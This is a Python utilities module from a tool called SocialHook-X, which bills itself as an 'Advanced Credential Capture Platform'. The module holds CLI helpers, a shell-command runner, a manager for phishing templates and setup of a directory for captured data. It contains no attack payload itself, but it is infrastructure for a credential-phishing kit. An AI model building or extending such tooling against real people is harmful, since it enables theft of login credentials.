"""
SocialHook-X Utils Package
Unified utility exports used by the CLI and core modules.
"""

import json
import logging
import platform
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from .formatters import CredentialFormatter, Formatters
from .helpers import DataHelpers, FileHelpers, StringHelpers, SystemHelpers
from .validators import InputValidator, Validators

logger = logging.getLogger(__name__)


class Colors:
    """ANSI color codes used by CLI output."""

    RED = "\033[0;91m"
    GREEN = "\033[0;92m"
    YELLOW = "\033[0;93m"
    ORANGE = "\033[0;93m"
    BLUE = "\033[0;94m"
    PURPLE = "\033[0;95m"
    CYAN = "\033[0;96m"
    WHITE = "\033[0;97m"
    NC = "\033[0m"


def print_header() -> None:
    """Display project header."""
    print(f"\n{Colors.CYAN}{'=' * 60}{Colors.NC}")
    print(f"{Colors.BLUE}")
    print(
        """
     ███████  ██████   ██████  ██   ██  █████  ██      ██   ██  ██████   ██████ ██   ██
    ██       ██    ██ ██      ██  ██  ██   ██ ██      ██   ██  ██    ██ ██      ██  ██
    ███████  ██    ██ ██      █████   ███████ ██      ███████  ██    ██ ██      █████
         ██ ██    ██ ██      ██  ██  ██   ██ ██      ██   ██  ██    ██ ██      ██  ██
    ███████  ██████   ██████ ██   ██ ██   ██ ███████ ██   ██  ██████   ██████ ██   ██

                    Advanced Credential Capture Platform
    """
    )
    print(f"{Colors.NC}")
    print(f"{Colors.GREEN}Version 4.0 | Educational Use Only{Colors.NC}")
    print(f"{Colors.CYAN}{'=' * 60}{Colors.NC}\n")


def print_success(msg: str) -> None:
    """Print success message."""
    print(f"{Colors.GREEN}[+]{Colors.NC} {msg}")


def print_error(msg: str) -> None:
    """Print error message."""
    print(f"{Colors.RED}[!]{Colors.NC} {msg}")


def print_info(msg: str) -> None:
    """Print info message."""
    print(f"{Colors.BLUE}[*]{Colors.NC} {msg}")


def print_warning(msg: str) -> None:
    """Print warning message."""
    print(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")


def command_exists(cmd: str) -> bool:
    """Check if a command exists in PATH."""
    return shutil.which(cmd) is not None


def run_command(cmd: str, shell: bool = True, timeout: int = 30) -> Tuple[bool, str]:
    """Run shell command and return (success, output)."""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.returncode == 0, result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return False, f"Command timeout after {timeout}s"
    except Exception as exc:
        return False, str(exc)


def get_os_type() -> str:
    """Get operating system type."""
    system = platform.system().lower()
    if "linux" in system:
        return "linux"
    if "darwin" in system:
        return "macos"
    if "windows" in system or "win32" in sys.platform:
        return "windows"
    return "unknown"


def get_architecture() -> str:
    """Get system architecture."""
    machine = platform.machine().lower()
    arch_map = {
        "x86_64": "amd64",
        "amd64": "amd64",
        "i386": "386",
        "i686": "386",
        "aarch64": "arm64",
        "arm": "arm",
        "armv7l": "arm",
    }
    return arch_map.get(machine, machine)


def save_to_output(data: Dict, filename: str, format_type: str = "json") -> Optional[str]:
    """Save data to an output file."""
    from core.config import config

    output_path = config.get_output_file(filename, format_type)
    try:
        with open(output_path, "w", encoding="utf-8") as handle:
            if format_type == "json":
                json.dump(data, handle, indent=2)
            else:
                handle.write(str(data))
        logger.info(f"Data saved to {output_path}")
        return output_path
    except Exception as exc:
        logger.error(f"Failed to save output: {exc}")
        return None


def load_json_file(filepath: str) -> Optional[Dict]:
    """Load JSON file content."""
    try:
        with open(filepath, "r", encoding="utf-8") as handle:
            return json.load(handle)
    except Exception as exc:
        logger.error(f"Failed to load {filepath}: {exc}")
        return None


def get_timestamp() -> str:
    """Get current timestamp."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class Logger:
    """Application logger helper."""

    @staticmethod
    def setup(level: int = logging.INFO) -> logging.Logger:
        """Setup logging configuration."""
        from core.config import config

        logging.basicConfig(
            level=level,
            format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler(config.LOG_FILE),
                logging.StreamHandler(),
            ],
        )
        return logging.getLogger(__name__)


class TemplateManager:
    """Manage phishing templates."""

    def __init__(self):
        from core.config import config

        self.templates_dir = config.TEMPLATES_DIR
        self.available = config.AVAILABLE_TEMPLATES

    def list_templates(self) -> List[str]:
        """List available templates."""
        return list(self.available.keys())

    def get_template_path(self, template: str) -> Path:
        """Get template directory path."""
        return self.templates_dir / template

    def template_exists(self, template: str) -> bool:
        """Check if template exists."""
        return self.get_template_path(template).exists()

    def get_template_files(self, template: str) -> List[str]:
        """Get files in template directory."""
        path = self.get_template_path(template)
        if not path.exists():
            return []
        return [f.name for f in path.iterdir()]


def setup_directories() -> None:
    """Ensure all required directories exist."""
    from core.config import config

    for directory in [config.TEMPLATES_DIR, config.SERVERS_DIR, config.OUTPUT_DIR, config.CAPTURED_DIR]:
        directory.mkdir(parents=True, exist_ok=True)
        logger.info(f"Directory ready: {directory}")


def validate_environment() -> bool:
    """Validate environment setup."""
    missing: List[str] = []

    if not (command_exists("python3") or command_exists("python")):
        missing.append("python3/python")
    for cmd in ["php", "curl"]:
        if not command_exists(cmd):
            missing.append(cmd)

    if missing:
        print_warning(f"Missing commands: {', '.join(missing)}")
        return False

    setup_directories()
    return True


__all__ = [
    # Legacy/CLI exports
    "Colors",
    "TemplateManager",
    "Logger",
    "print_header",
    "print_success",
    "print_error",
    "print_info",
    "print_warning",
    "command_exists",
    "run_command",
    "get_os_type",
    "get_architecture",
    "save_to_output",
    "load_json_file",
    "get_timestamp",
    "setup_directories",
    "validate_environment",
    # Utility submodules
    "Validators",
    "InputValidator",
    "Formatters",
    "CredentialFormatter",
    "FileHelpers",
    "DataHelpers",
    "StringHelpers",
    "SystemHelpers",
]
